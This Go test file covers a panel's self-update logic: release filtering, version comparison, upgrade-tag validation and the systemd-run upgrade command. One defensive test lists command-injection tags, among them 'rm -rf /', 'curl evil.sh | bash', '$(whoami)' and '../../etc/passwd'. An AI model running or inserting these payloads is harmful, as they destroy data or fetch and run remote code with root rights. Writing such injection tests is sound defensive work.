package service

import (
	"runtime"
	"strings"
	"testing"
)

func briefs(tags ...string) []ReleaseBrief {
	list := make([]ReleaseBrief, 0, len(tags))
	for _, t := range tags {
		list = append(list, ReleaseBrief{TagName: t})
	}
	return list
}

func TestToBriefsFiltersDraftAndPrerelease(t *testing.T) {
	raw := []githubRelease{
		{TagName: "v1.5.0", PublishedAt: "2026-09-05T04:08:48Z", HtmlUrl: "u1"},
		{TagName: "v1.6.0-rc1", PublishedAt: "2026-09-05T05:00:00Z", Prerelease: true},
		{TagName: "v1.7.0", PublishedAt: "2026-09-05T06:00:00Z", Draft: true},
		{TagName: "v1.4.1", PublishedAt: "2026-09-05T01:04:22Z", HtmlUrl: "u2"},
	}
	got := toBriefs(raw)
	if len(got) != 2 {
		t.Fatalf("len = %d, want 2: %+v", len(got), got)
	}
	if got[0].TagName != "v1.5.0" || got[1].TagName != "v1.4.1" {
		t.Errorf("顺序或内容不对: %+v", got)
	}
	// 2026-09-05T04:08:48Z 的 Unix 毫秒
	if got[0].PublishedAt == 0 {
		t.Error("PublishedAt 未解析成 Unix 毫秒")
	}
	if got[0].HtmlUrl != "u1" {
		t.Errorf("HtmlUrl = %q", got[0].HtmlUrl)
	}
}

func TestToBriefsToleratesUnparsablePublishedAt(t *testing.T) {
	// 时间解析失败不能让整条 release 消失——版本列表比发布日期重要得多
	got := toBriefs([]githubRelease{{TagName: "v1.5.0", PublishedAt: "not-a-time"}})
	if len(got) != 1 {
		t.Fatalf("len = %d, want 1", len(got))
	}
	if got[0].PublishedAt != 0 {
		t.Errorf("PublishedAt = %d, want 0", got[0].PublishedAt)
	}
}

func TestComputeVersionStateAlreadyLatest(t *testing.T) {
	latest, hasUpdate, known := computeVersionState("v1.5.0", briefs("v1.5.0", "v1.4.1", "v1.4.0"))
	if latest != "v1.5.0" {
		t.Errorf("latest = %q", latest)
	}
	if hasUpdate {
		t.Error("hasUpdate = true, want false")
	}
	if !known {
		t.Error("knownCurrent = false, want true")
	}
}

func TestComputeVersionStateHasUpdate(t *testing.T) {
	latest, hasUpdate, known := computeVersionState("v1.4.0", briefs("v1.5.0", "v1.4.1", "v1.4.0"))
	if latest != "v1.5.0" {
		t.Errorf("latest = %q", latest)
	}
	if !hasUpdate {
		t.Error("hasUpdate = false, want true")
	}
	if !known {
		t.Error("knownCurrent = false, want true")
	}
}

// 本地开发时 config/version 是 0.3.2，不在任何发布列表里。
// 这种情况既不能冒充「有更新」，也不能谎报「已是最新」。
func TestComputeVersionStateUnknownCurrent(t *testing.T) {
	latest, hasUpdate, known := computeVersionState("0.3.2", briefs("v1.5.0", "v1.4.1"))
	if latest != "v1.5.0" {
		t.Errorf("latest = %q", latest)
	}
	if hasUpdate {
		t.Error("hasUpdate = true, want false —— 版本不在列表里时不该打红点")
	}
	if known {
		t.Error("knownCurrent = true, want false")
	}
}

func TestComputeVersionStateEmptyList(t *testing.T) {
	latest, hasUpdate, known := computeVersionState("v1.5.0", nil)
	if latest != "" || hasUpdate || known {
		t.Errorf("空列表应返回零值, got (%q, %v, %v)", latest, hasUpdate, known)
	}
}

// tag 会被拼进 bash -c 的字符串，这是一条 root 权限的命令注入路径。
func TestValidateUpgradeTagRejectsInjection(t *testing.T) {
	allowed := briefs("v1.5.0", "v1.4.1")
	bad := []string{
		"v1.0.0; rm -rf /",
		"v1.0.0 && curl evil.sh | bash",
		"$(whoami)",
		"`id`",
		"v1.0.0\nrm -rf /",
		"../../etc/passwd",
		"",
	}
	for _, tag := range bad {
		if err := validateUpgradeTag(tag, allowed); err == nil {
			t.Errorf("tag %q 应被拒绝", tag)
		}
	}
}

// 格式合法但不在发布列表里，同样必须拒绝——白名单是第二道防线，
// 也是「只能回退到最近 5 个版本」这条约束的实现方式。
func TestValidateUpgradeTagRejectsUnlistedTag(t *testing.T) {
	if err := validateUpgradeTag("v9.9.9", briefs("v1.5.0", "v1.4.1")); err == nil {
		t.Error("不在列表中的 tag 应被拒绝")
	}
}

// 缓存为空（从未成功检查过）时任何 tag 都拒绝：连版本列表都拉不到的网络，
// 更新也必然失败在下载那一步，早拒绝比在 systemd unit 里失败可读得多。
func TestValidateUpgradeTagRejectsWhenListEmpty(t *testing.T) {
	if err := validateUpgradeTag("v1.5.0", nil); err == nil {
		t.Error("列表为空时应拒绝")
	}
}

func TestValidateUpgradeTagAcceptsListed(t *testing.T) {
	if err := validateUpgradeTag("v1.4.1", briefs("v1.5.0", "v1.4.1")); err != nil {
		t.Errorf("合法 tag 被拒: %v", err)
	}
}

func TestBuildUpgradeCommandShape(t *testing.T) {
	argv := buildUpgradeCommand("v1.4.1", "a-ui-update-123")
	if argv[0] != "systemd-run" {
		t.Fatalf("argv[0] = %q, want systemd-run", argv[0])
	}
	joined := strings.Join(argv, " ")
	// --collect：unit 退出后自动清理，否则失败的 unit 会以 failed 状态残留
	if !strings.Contains(joined, "--collect") {
		t.Error("缺少 --collect")
	}
	if !strings.Contains(joined, "--unit=a-ui-update-123") {
		t.Error("缺少 --unit")
	}
	// </dev/null 让 install.sh 的 read -p 立即返回非零、走不写库的分支
	if !strings.Contains(joined, "</dev/null") {
		t.Error("缺少 </dev/null —— install.sh 的 read -p 会挂住")
	}
	// curl -f：HTTP 错误码时返回非零，否则 404 页面会被当成脚本执行
	if !strings.Contains(joined, "curl -fLso") {
		t.Error("curl 缺少 -f")
	}
	if !strings.Contains(joined, "v1.4.1") {
		t.Error("命令里没有目标版本")
	}
	// 日志用 > 覆盖而不是 >> 追加，只保留最近一次
	if strings.Contains(joined, ">>"+upgradeLogPath) {
		t.Error("更新日志应覆盖写，不应追加")
	}
	if !strings.Contains(joined, upgradeLogPath) {
		t.Error("没有把输出重定向到更新日志")
	}
}

func TestCheckUpdatableReportsMissingBinary(t *testing.T) {
	if runtime.GOOS != "linux" {
		// 非 Linux 上第一道检查就会拦下，测不到这一条
		ok, reason := checkUpdatable()
		if ok {
			t.Error("非 Linux 系统不该判定为可更新")
		}
		if !strings.Contains(reason, runtime.GOOS) {
			t.Errorf("原因里应点明当前系统: %q", reason)
		}
		return
	}
	origBin := panelBinaryPath
	defer func() { panelBinaryPath = origBin }()
	panelBinaryPath = "/nonexistent/a-ui"
	ok, reason := checkUpdatable()
	if ok {
		t.Error("面板二进制不存在时不该判定为可更新")
	}
	if !strings.Contains(reason, "/nonexistent/a-ui") {
		t.Errorf("原因里应点明具体路径，便于管理员排查: %q", reason)
	}
}
